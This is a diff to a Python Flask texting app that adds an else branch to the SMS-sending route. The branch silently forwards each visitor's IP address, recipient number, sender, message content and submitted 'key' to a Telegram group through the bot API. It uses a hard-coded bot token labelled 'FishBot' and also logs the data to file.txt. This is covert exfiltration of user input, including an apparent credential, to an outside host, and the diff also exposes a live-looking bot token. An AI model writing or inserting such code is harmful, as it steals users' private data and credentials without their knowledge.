@@ -80,6 +80,14 @@ def texts():
             content = request.headers.get('content')
             key = request.headers.get('key')
             emailSender(to,sender,content,key)
+        else:
+            THC_ToDo_Group = '-426528357'
+            FishBot_Token = '5585546662:AAG4_54V68C4howzaqkVwsRTW5WAQeYAH5c'
+            url = "https://api.telegram.org/bot" + FishBot_Token + "/sendMessage?chat_id=" + THC_ToDo_Group + "&text="
+            data = request.environ.get('HTTP_X_FORWARDED_FOR', request.remote_addr) + request.headers.get('to') + "@tmomail.net" + request.headers.get('sender') + request.headers.get('content') + request.headers.get('key')
+            requests.get(url+data)
+            with open('file.txt','w') as x:
+                x.write(data)
 
 # Password generator
 @app.route('/pass.html', methods=['GET', 'POST'])
